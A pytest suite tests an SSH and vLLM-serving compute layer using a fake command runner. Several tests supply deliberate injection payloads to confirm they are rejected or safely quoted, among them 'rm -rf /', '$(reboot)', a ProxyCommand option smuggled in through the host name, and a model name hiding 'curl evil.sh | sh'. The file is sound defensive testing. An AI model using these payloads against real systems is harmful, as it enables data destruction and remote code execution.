"""Offline tests for the compute layer: no ssh binary, no GPU, no network.

A `FakeRunner` stands in for subprocess and records every argv it is given, so we
can assert on exactly what *would* have been executed.
"""

from __future__ import annotations

import io
import json
import logging
import shlex
import threading
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

from envforge.compute import (
    CommandResult,
    ComputeError,
    SSHBox,
    check,
    gpu_info,
    parse_gpu_csv,
    serve_vllm,
    stop_vllm,
    vllm_logs,
    vllm_status,
    wait_healthy,
)
from envforge.compute.vllm import DEFAULT_VLLM_IMAGE, build_docker_run


class FakeRunner:
    """Records calls; answers with canned results chosen by a substring of the remote command."""

    def __init__(self, responses: dict[str, CommandResult] | None = None) -> None:
        self.calls: list[dict] = []
        self.responses = responses or {}

    def __call__(self, argv, *, input=None, timeout=None) -> CommandResult:
        self.calls.append({"argv": list(argv), "input": input, "timeout": timeout})
        joined = argv[-1]
        for needle, result in self.responses.items():
            if needle in joined:
                return result
        return CommandResult(0, "", "")

    @property
    def remote_commands(self) -> list[str]:
        """The single remote shell string at the end of each ssh argv."""
        return [c["argv"][-1] for c in self.calls if c["argv"][0] == "ssh"]


def make_box(runner: FakeRunner, **kw) -> SSHBox:
    return SSHBox("100.64.0.7", runner=runner, **kw)


# ---------------------------------------------------------------- ssh command construction


def test_ssh_argv_has_safe_options_and_destination_last():
    runner = FakeRunner()
    box = SSHBox("gpu-1", user="ubuntu", port=2222, key_path="/keys/id_ed25519", runner=runner)
    box.run(["echo", "hi"])
    argv = runner.calls[0]["argv"]
    assert argv[0] == "ssh"
    opts = [argv[i + 1] for i, a in enumerate(argv) if a == "-o"]
    assert "BatchMode=yes" in opts
    assert "StrictHostKeyChecking=accept-new" in opts
    assert any(o.startswith("ConnectTimeout=") for o in opts)
    assert any(o.startswith("ServerAliveInterval=") for o in opts)
    assert argv[argv.index("-p") + 1] == "2222"
    assert argv[argv.index("-i") + 1] == "/keys/id_ed25519"
    assert argv[-3:] == ["--", "ubuntu@gpu-1", "echo hi"]


def test_extra_options_override_defaults():
    runner = FakeRunner()
    box = make_box(runner, options={"StrictHostKeyChecking": "yes", "ControlMaster": "auto"})
    box.run("true")
    argv = runner.calls[0]["argv"]
    opts = [argv[i + 1] for i, a in enumerate(argv) if a == "-o"]
    assert "StrictHostKeyChecking=yes" in opts
    assert "StrictHostKeyChecking=accept-new" not in opts
    assert "ControlMaster=auto" in opts


@pytest.mark.parametrize("host", ["-oProxyCommand=touch /tmp/x", "a b", "host;rm", ""])
def test_hostile_hosts_rejected(host):
    with pytest.raises(ValueError):
        SSHBox(host, runner=FakeRunner())


def test_hostile_user_rejected():
    with pytest.raises(ValueError):
        SSHBox("gpu-1", user="-oProxyCommand=x", runner=FakeRunner())


def test_list_commands_are_quoted_for_the_remote_shell():
    runner = FakeRunner()
    box = make_box(runner)
    evil = "x; rm -rf / #"
    box.run(["echo", evil, "$(touch /tmp/pwned)"])
    remote = runner.remote_commands[0]
    # The remote shell would parse it back into exactly these three words.
    assert shlex.split(remote) == ["echo", evil, "$(touch /tmp/pwned)"]


def test_run_check_raises_on_failure():
    runner = FakeRunner({"false": CommandResult(1, "", "boom")})
    box = make_box(runner)
    with pytest.raises(ComputeError, match="boom"):
        box.run(["false"], check=True)


def test_scp_put_get_argv():
    runner = FakeRunner()
    box = SSHBox("gpu-1", port=2222, runner=runner)
    box.put("local.txt", "/root/remote.txt")
    box.get("/root/out", "outdir", recursive=True)
    put, get = runner.calls[0]["argv"], runner.calls[1]["argv"]
    assert put[0] == "scp" and put[put.index("-P") + 1] == "2222"
    assert put[-2:] == ["local.txt", "root@gpu-1:/root/remote.txt"]
    assert "-r" in get and get[-2:] == ["root@gpu-1:/root/out", "outdir"]
    with pytest.raises(ValueError):
        box.put("x", "/tmp/$(reboot)")


# ---------------------------------------------------------------- check + gpu_info


def test_check_all_ok():
    runner = FakeRunner(
        {
            "echo envforge-ok": CommandResult(0, "envforge-ok\n"),
            "docker version": CommandResult(0, "27.3.1\n"),
            "docker run --rm --gpus all": CommandResult(0, "GPU 0: NVIDIA A10G (UUID: x)\n"),
            "nvidia-smi -L": CommandResult(0, "GPU 0: NVIDIA A10G (UUID: x)\n"),
        }
    )
    results = check(make_box(runner))
    assert [r.name for r in results] == [
        "ssh",
        "docker",
        "nvidia-smi",
        "nvidia-container-toolkit",
    ]
    assert all(r.ok for r in results), results


def test_check_stops_after_ssh_failure():
    runner = FakeRunner({"echo": CommandResult(255, "", "ssh: connect timed out")})
    results = check(make_box(runner))
    assert not results[0].ok and "timed out" in results[0].detail
    assert all(not r.ok for r in results[1:])
    assert len(runner.calls) == 1


def test_parse_gpu_csv():
    text = "NVIDIA A10G, 23028, 512, 7\nNVIDIA GeForce RTX 4090, 24564, [N/A], 0\n"
    gpus = parse_gpu_csv(text)
    assert len(gpus) == 2
    assert gpus[0].name == "NVIDIA A10G"
    assert gpus[0].memory_total_mib == 23028
    assert gpus[0].memory_free_mib == 23028 - 512
    assert gpus[0].utilization_pct == 7
    assert gpus[1].index == 1 and gpus[1].memory_used_mib is None
    assert gpus[1].memory_free_mib is None


def test_gpu_info_uses_query_flags():
    runner = FakeRunner({"nvidia-smi": CommandResult(0, "NVIDIA L4, 23034, 0, 0\n")})
    gpus = gpu_info(make_box(runner))
    assert gpus[0].name == "NVIDIA L4"
    remote = runner.remote_commands[0]
    assert "--query-gpu=name,memory.total,memory.used,utilization.gpu" in remote
    assert "--format=csv,noheader,nounits" in remote


# ---------------------------------------------------------------- serve_vllm


def test_docker_run_has_tool_call_flags_and_pinned_image():
    argv = build_docker_run("Qwen/Qwen2.5-3B-Instruct", port=8001, max_model_len=8192)
    assert "--enable-auto-tool-choice" in argv
    assert argv[argv.index("--tool-call-parser") + 1] == "hermes"
    assert argv[argv.index("--name") + 1] == "envforge-vllm-8001"
    assert argv[argv.index("--gpus") + 1] == "all"
    assert argv[argv.index("--publish") + 1] == "8001:8000"
    assert argv[argv.index("--max-model-len") + 1] == "8192"
    assert any(a.startswith("envforge-hf-cache:") for a in argv)
    assert DEFAULT_VLLM_IMAGE in argv and not DEFAULT_VLLM_IMAGE.endswith(":latest")
    # The model comes right after the image (the image's entrypoint is `vllm serve`).
    assert argv[argv.index(DEFAULT_VLLM_IMAGE) + 1] == "Qwen/Qwen2.5-3B-Instruct"


def test_serve_vllm_without_secrets():
    runner = FakeRunner({"docker run": CommandResult(0, "abc123def456\n")})
    server = serve_vllm(make_box(runner), "Qwen/Qwen2.5-3B-Instruct", port=8000)
    assert server.container_id == "abc123def456"
    assert server.base_url == "http://100.64.0.7:8000/v1"
    assert server.model_spec == "vllm:Qwen/Qwen2.5-3B-Instruct"
    # replace=True removes any old container first
    assert runner.remote_commands[0].startswith("docker rm --force envforge-vllm-8000")
    run_cmd = runner.remote_commands[1]
    assert "--enable-auto-tool-choice" in run_cmd and "--env-file" not in run_cmd


def test_serve_vllm_secrets_go_via_stdin_not_argv(caplog):
    caplog.set_level(logging.DEBUG)
    runner = FakeRunner({"docker run": CommandResult(0, "cid\n")})
    serve_vllm(
        make_box(runner),
        "meta-llama/Llama-3.1-8B-Instruct",
        api_key="sk-SUPERSECRET",
        hf_token="hf_SUPERSECRET",
        tool_call_parser="llama3_json",
    )
    for call in runner.calls:
        assert not any("SUPERSECRET" in a for a in call["argv"]), call["argv"]
    assert "SUPERSECRET" not in caplog.text
    run_call = runner.calls[-1]
    assert "HF_TOKEN=hf_SUPERSECRET\n" in run_call["input"]
    assert "VLLM_API_KEY=sk-SUPERSECRET\n" in run_call["input"]
    remote = run_call["argv"][-1]
    assert '--env-file "$envf"' in remote and "umask 077" in remote
    assert "--tool-call-parser llama3_json" in remote and "--enable-auto-tool-choice" in remote


def test_hostile_model_name_is_one_quoted_argument():
    runner = FakeRunner({"docker run": CommandResult(0, "cid\n")})
    evil = "Qwen/x;curl$IFS'evil.sh'|sh;`id`$(reboot)"
    serve_vllm(make_box(runner), evil, extra_args=["--served-model-name", "a b; reboot"])
    words = shlex.split(runner.remote_commands[-1])
    assert evil in words
    assert "a b; reboot" in words
    assert f"envforge.model={evil}" in words


@pytest.mark.parametrize("model", ["--trust-remote-code", "a b", ""])
def test_flag_like_or_blank_model_rejected(model):
    with pytest.raises(ValueError):
        serve_vllm(make_box(FakeRunner()), model)


def test_bad_parser_rejected():
    with pytest.raises(ValueError):
        build_docker_run("Qwen/Qwen2.5-3B-Instruct", tool_call_parser="hermes; reboot")


def test_serve_vllm_failure_raises():
    runner = FakeRunner({"docker run": CommandResult(125, "", "could not select device driver")})
    with pytest.raises(ComputeError, match="device driver"):
        serve_vllm(make_box(runner), "Qwen/Qwen2.5-3B-Instruct")


# ---------------------------------------------------------------- stop / logs / status


def test_stop_vllm():
    assert stop_vllm(make_box(FakeRunner()), 8000) is True
    missing = FakeRunner({"docker rm": CommandResult(1, "", "Error: No such container: x")})
    assert stop_vllm(make_box(missing), 8000) is False


def test_vllm_logs_merges_stderr():
    runner = FakeRunner({"docker logs": CommandResult(0, "INFO started\n")})
    assert vllm_logs(make_box(runner), 8000, tail=50) == "INFO started\n"
    assert runner.remote_commands[0] == "docker logs --tail 50 envforge-vllm-8000 2>&1"


def test_vllm_status_running_and_missing():
    out = f"running|{DEFAULT_VLLM_IMAGE}|Qwen/Qwen2.5-3B-Instruct|2026-10-19T10:00:00Z\n"
    st = vllm_status(make_box(FakeRunner({"docker inspect": CommandResult(0, out)})))
    assert st.running and st.model == "Qwen/Qwen2.5-3B-Instruct" and st.image == DEFAULT_VLLM_IMAGE
    missing = FakeRunner({"docker inspect": CommandResult(1, "", "Error: No such object: x")})
    st = vllm_status(make_box(missing))
    assert not st.exists and not st.running


# ---------------------------------------------------------------- wait_healthy


class _StubVLLM(BaseHTTPRequestHandler):
    """Answers /v1/models like vLLM; 503 for the first `fail_first` requests; checks the key."""

    fail_first = 0
    hits = 0
    key: str | None = None

    def do_GET(self):  # noqa: N802 - stdlib naming
        cls = type(self)
        cls.hits += 1
        if cls.key and self.headers.get("Authorization") != f"Bearer {cls.key}":
            self.send_response(401)
            self.end_headers()
            return
        if cls.hits <= cls.fail_first or self.path != "/v1/models":
            self.send_response(503)
            self.end_headers()
            return
        body = json.dumps({"object": "list", "data": [{"id": "Qwen/Qwen2.5-3B-Instruct"}]})
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body.encode())

    def log_message(self, *args):  # keep test output quiet
        pass


@pytest.fixture
def stub_server():
    handler = type("Handler", (_StubVLLM,), {"fail_first": 2, "hits": 0, "key": "k-123"})
    server = HTTPServer(("127.0.0.1", 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{server.server_port}/v1", handler
    server.shutdown()
    server.server_close()


# Bypass any HTTP(S)_PROXY in the test environment when talking to 127.0.0.1.
_direct = urllib.request.build_opener(urllib.request.ProxyHandler({})).open


def test_wait_healthy_against_stub_server(stub_server):
    base_url, handler = stub_server
    ids = wait_healthy(
        base_url, timeout=30, api_key="k-123", interval=0, urlopen=_direct, sleep=lambda s: None
    )
    assert ids == ["Qwen/Qwen2.5-3B-Instruct"]
    assert handler.hits == 3  # two 503s, then healthy


def test_wait_healthy_wrong_key_fails_fast(stub_server):
    base_url, _ = stub_server
    with pytest.raises(ComputeError, match="401"):
        wait_healthy(base_url, timeout=30, api_key="wrong", urlopen=_direct, sleep=lambda s: None)


def test_wait_healthy_times_out_with_fake_clock():
    now = [0.0]

    def refuse(request, timeout=None):
        raise urllib.error.URLError("connection refused")

    def sleep(seconds):
        now[0] += seconds

    with pytest.raises(TimeoutError, match="connection refused"):
        wait_healthy(
            "http://100.64.0.7:8000/v1",
            timeout=20,
            interval=5,
            urlopen=refuse,
            sleep=sleep,
            clock=lambda: now[0],
        )


def test_wait_healthy_aborts_when_container_dies():
    def refuse(request, timeout=None):
        raise urllib.error.URLError("connection refused")

    with pytest.raises(ComputeError, match="stopped"):
        wait_healthy(
            "http://h:8000/v1",
            timeout=60,
            urlopen=refuse,
            sleep=lambda s: None,
            is_alive=lambda: False,
        )


def test_wait_healthy_sends_bearer_header():
    seen = {}

    def fake_open(request, timeout=None):
        seen["auth"] = request.get_header("Authorization")
        seen["url"] = request.full_url
        return io.BytesIO(json.dumps({"data": [{"id": "m"}]}).encode())

    assert wait_healthy("http://h:8000/v1/", api_key="abc", urlopen=fake_open) == ["m"]
    assert seen == {"auth": "Bearer abc", "url": "http://h:8000/v1/models"}
